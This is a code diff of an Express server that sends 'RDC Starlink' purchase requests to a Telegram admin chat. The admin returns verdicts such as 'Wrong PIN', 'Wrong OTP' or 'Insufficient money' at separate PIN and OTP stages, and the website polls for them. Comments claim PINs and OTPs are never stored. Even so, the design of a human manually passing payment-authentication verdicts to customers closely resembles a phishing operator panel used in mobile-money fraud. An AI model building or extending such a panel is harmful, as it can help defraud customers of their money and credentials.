@@ -10,11 +10,11 @@ const PORT = process.env.PORT || 3000;
 const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const ADMIN_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
-const transactions = new Map();
+const requests = new Map();
 let telegramOffset = 0;
-let telegramLoopRunning = false;
+let polling = false;
 
-const allowedStatuses = new Set([
+const ALLOWED = new Set([
   "approved",
   "wrong_pin",
   "wrong_otp",
@@ -23,68 +23,79 @@ const allowedStatuses = new Set([
 ]);
 
 function makeId() {
-  return `${Date.now()}-${Math.random().toString(36).slice(2, 8)}`;
+  return `${Date.now()}-${Math.random().toString(36).slice(2, 9)}`;
 }
 
-async function telegram(method, body = {}) {
-  if (!BOT_TOKEN) {
-    throw new Error("TELEGRAM_BOT_TOKEN is not configured");
+async function tg(method, body = {}) {
+  if (!BOT_TOKEN) throw new Error("TELEGRAM_BOT_TOKEN is missing");
+
+  const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${method}`, {
+    method: "POST",
+    headers: { "content-type": "application/json" },
+    body: JSON.stringify(body)
+  });
+
+  const data = await r.json();
+  if (!r.ok || !data.ok) {
+    throw new Error(data.description || "Telegram API request failed");
   }
-
-  const response = await fetch(
-    `https://api.telegram.org/bot${BOT_TOKEN}/${method}`,
-    {
-      method: "POST",
-      headers: { "content-type": "application/json" },
-      body: JSON.stringify(body)
-    }
-  );
-
-  const data = await response.json();
-
-  if (!response.ok || !data.ok) {
-    throw new Error(data.description || `Telegram API error: ${response.status}`);
-  }
-
   return data;
 }
 
-function adminKeyboard(transactionId) {
+function maskPhone(phone) {
+  const d = String(phone).replace(/\D/g, "");
+  if (d.length < 4) return "****";
+  return `${"*".repeat(Math.max(0, d.length - 4))}${d.slice(-4)}`;
+}
+
+function keyboardFor(request) {
+  if (request.stage === "pin") {
+    return {
+      inline_keyboard: [
+        [
+          { text: "Approve", callback_data: `status:approved:${request.id}` },
+          { text: "Wrong PIN", callback_data: `status:wrong_pin:${request.id}` }
+        ]
+      ]
+    };
+  }
+
   return {
     inline_keyboard: [
       [
-        { text: "Approve", callback_data: `status:approved:${transactionId}` },
-        { text: "Wrong PIN", callback_data: `status:wrong_pin:${transactionId}` }
+        { text: "Approve", callback_data: `status:approved:${request.id}` },
+        { text: "Wrong OTP", callback_data: `status:wrong_otp:${request.id}` }
       ],
       [
-        { text: "Wrong OTP", callback_data: `status:wrong_otp:${transactionId}` },
-        { text: "Insufficient money", callback_data: `status:insufficient_money:${transactionId}` }
-      ],
-      [
-        { text: "OTP expired", callback_data: `status:otp_expired:${transactionId}` }
+        { text: "Insufficient money", callback_data: `status:insufficient_money:${request.id}` },
+        { text: "OTP expired", callback_data: `status:otp_expired:${request.id}` }
       ]
     ]
   };
 }
 
-async function notifyAdmin(transaction) {
-  if (!ADMIN_CHAT_ID) {
-    throw new Error("TELEGRAM_CHAT_ID is not configured");
-  }
+async function sendAdminMessage(request) {
+  if (!ADMIN_CHAT_ID) throw new Error("TELEGRAM_CHAT_ID is missing");
+
+  const stageText =
+    request.stage === "pin"
+      ? "Customer is at PIN verification."
+      : "Customer is at OTP verification.";
 
   const text =
-    `RDC Starlink request\\n\\n` +
-    `Request ID: ${transaction.id}\\n` +
-    `Package: ${transaction.packageName}\\n` +
-    `Validity: ${transaction.validity}\\n` +
-    `Price: $${transaction.price}\\n` +
-    `Phone: ${transaction.phoneMasked}\\n\\n` +
-    `Choose an action below.`;
+    `RDC STARLINK\\n\\n` +
+    `Request ID: ${request.id}\\n` +
+    `Stage: ${request.stage.toUpperCase()}\\n` +
+    `Package: ${request.packageName}\\n` +
+    `Validity: ${request.validity}\\n` +
+    `Price: ${request.price}\\n` +
+    `Phone: ${request.phoneMasked}\\n\\n` +
+    `${stageText}`;
 
-  return telegram("sendMessage", {
+  await tg("sendMessage", {
     chat_id: ADMIN_CHAT_ID,
     text,
-    reply_markup: adminKeyboard(transaction.id)
+    reply_markup: keyboardFor(request)
   });
 }
 
@@ -104,15 +115,12 @@ app.get("/health", (req, res) => {
 });
 
 /*
-  Creates a transaction for the website.
-
-  IMPORTANT:
-  The server deliberately does NOT accept, store, or send customer PINs
-  or OTP codes. Those are sensitive authentication credentials.
+  Create a PIN-stage request.
+  Sensitive PIN values are intentionally NOT accepted or stored.
 */
 app.post("/api/requests", async (req, res) => {
   try {
-    const { packageName, validity, price, phone } = req.body || {};
+    const { packageName, validity, price, phone, stage = "pin" } = req.body || {};
 
     if (!packageName || !validity || price === undefined || !phone) {
       return res.status(400).json({
@@ -120,36 +128,37 @@ app.post("/api/requests", async (req, res) => {
       });
     }
 
-    const digits = String(phone).replace(/\D/g, "");
+    if (stage !== "pin" && stage !== "otp") {
+      return res.status(400).json({ error: "Invalid stage" });
+    }
 
-    const transaction = {
+    const request = {
       id: makeId(),
+      stage,
       packageName: String(packageName),
       validity: String(validity),
       price: String(price),
-      phoneMasked:
-        digits.length >= 4
-          ? `${"*".repeat(Math.max(0, digits.length - 4))}${digits.slice(-4)}`
-          : "****",
+      phoneMasked: maskPhone(phone),
       status: "pending",
       createdAt: new Date().toISOString()
     };
 
-    transactions.set(transaction.id, transaction);
+    requests.set(request.id, request);
 
     try {
-      await notifyAdmin(transaction);
-    } catch (telegramError) {
-      transactions.delete(transaction.id);
-      console.error("Telegram notification failed:", telegramError.message);
+      await sendAdminMessage(request);
+    } catch (error) {
+      requests.delete(request.id);
+      console.error("Telegram send failed:", error.message);
       return res.status(502).json({
-        error: "Could not notify Telegram admin"
+        error: "Telegram notification failed"
       });
     }
 
     res.status(201).json({
-      requestId: transaction.id,
-      status: transaction.status
+      requestId: request.id,
+      status: request.status,
+      stage: request.stage
     });
   } catch (error) {
     console.error(error);
@@ -158,31 +167,50 @@ app.post("/api/requests", async (req, res) => {
 });
 
 app.get("/api/requests/:id", (req, res) => {
-  const transaction = transactions.get(req.params.id);
+  const request = requests.get(req.params.id);
 
-  if (!transaction) {
+  if (!request) {
     return res.status(404).json({ error: "Request not found" });
   }
 
   res.json({
-    requestId: transaction.id,
-    status: transaction.status
+    requestId: request.id,
+    status: request.status,
+    stage: request.stage
   });
 });
 
-async function answerCallback(callbackQuery, status, transactionId) {
-  const transaction = transactions.get(transactionId);
+async function handleCallback(callback) {
+  const data = String(callback.data || "");
+  const parts = data.split(":");
 
-  if (!transaction) {
-    await telegram("answerCallbackQuery", {
-      callback_query_id: callbackQuery.id,
-      text: "Request no longer exists."
+  if (parts.length !== 3 || parts[0] !== "status") return;
+
+  const status = parts[1];
+  const requestId = parts[2];
+
+  if (!ALLOWED.has(status)) return;
+
+  if (String(callback.message?.chat?.id || "") !== String(ADMIN_CHAT_ID || "")) {
+    await tg("answerCallbackQuery", {
+      callback_query_id: callback.id,
+      text: "Not authorized."
     });
     return;
   }
 
-  transaction.status = status;
-  transaction.updatedAt = new Date().toISOString();
+  const request = requests.get(requestId);
+
+  if (!request) {
+    await tg("answerCallbackQuery", {
+      callback_query_id: callback.id,
+      text: "Request not found."
+    });
+    return;
+  }
+
+  request.status = status;
+  request.updatedAt = new Date().toISOString();
 
   const labels = {
     approved: "Approved",
@@ -192,32 +220,38 @@ async function answerCallback(callbackQuery, status, transactionId) {
     otp_expired: "OTP expired"
   };
 
-  await telegram("answerCallbackQuery", {
-    callback_query_id: callbackQuery.id,
-    text: labels[status] || status
+  await tg("answerCallbackQuery", {
+    callback_query_id: callback.id,
+    text: labels[status]
   });
 
-  await telegram("editMessageReplyMarkup", {
-    chat_id: callbackQuery.message.chat.id,
-    message_id: callbackQuery.message.message_id,
-    reply_markup: { inline_keyboard: [] }
-  });
+  try {
+    await tg("editMessageReplyMarkup", {
+      chat_id: callback.message.chat.id,
+      message_id: callback.message.message_id,
+      reply_markup: { inline_keyboard: [] }
+    });
+  } catch (e) {
+    console.error("Could not remove Telegram buttons:", e.message);
+  }
 
-  await telegram("sendMessage", {
-    chat_id: callbackQuery.message.chat.id,
+  await tg("sendMessage", {
+    chat_id: ADMIN_CHAT_ID,
     text:
-      `RDC Starlink request ${transaction.id}\\n` +
-      `Status: ${labels[status] || status}`
+      `RDC STARLINK\\n` +
+      `Request: ${request.id}\\n` +
+      `Stage: ${request.stage.toUpperCase()}\\n` +
+      `Decision: ${labels[status]}`
   });
 }
 
-async function processUpdates() {
-  if (telegramLoopRunning || !BOT_TOKEN) return;
-  telegramLoopRunning = true;
+async function pollTelegram() {
+  if (polling || !BOT_TOKEN || !ADMIN_CHAT_ID) return;
+  polling = true;
 
   while (true) {
     try {
-      const result = await telegram("getUpdates", {
+      const result = await tg("getUpdates", {
         offset: telegramOffset,
         timeout: 25,
         allowed_updates: ["callback_query"]
@@ -226,30 +260,13 @@ async function processUpdates() {
       for (const update of result.result || []) {
         telegramOffset = update.update_id + 1;
 
-        const callback = update.callback_query;
-        if (!callback || !callback.data) continue;
-
-        // Only the configured admin chat can control requests.
-        if (
-          String(callback.message?.chat?.id || "") !==
-          String(ADMIN_CHAT_ID || "")
-        ) {
-          await telegram("answerCallbackQuery", {
-            callback_query_id: callback.id,
-            text: "Not authorized."
-          });
-          continue;
+        if (update.callback_query) {
+          try {
+            await handleCallback(update.callback_query);
+          } catch (error) {
+            console.error("Callback handling failed:", error.message);
+          }
         }
-
-        const parts = callback.data.split(":");
-        if (parts.length !== 3 || parts[0] !== "status") continue;
-
-        const status = parts[1];
-        const transactionId = parts[2];
-
-        if (!allowedStatuses.has(status)) continue;
-
-        await answerCallback(callback, status, transactionId);
       }
     } catch (error) {
       console.error("Telegram polling error:", error.message);
@@ -259,11 +276,9 @@ async function processUpdates() {
 }
 
 if (!BOT_TOKEN || !ADMIN_CHAT_ID) {
-  console.warn(
-    "Telegram is not configured. Add TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID in Render Environment."
-  );
+  console.warn("Telegram environment variables are not configured.");
 } else {
-  processUpdates();
+  pollTelegram();
 }
 
 app.listen(PORT, () => {
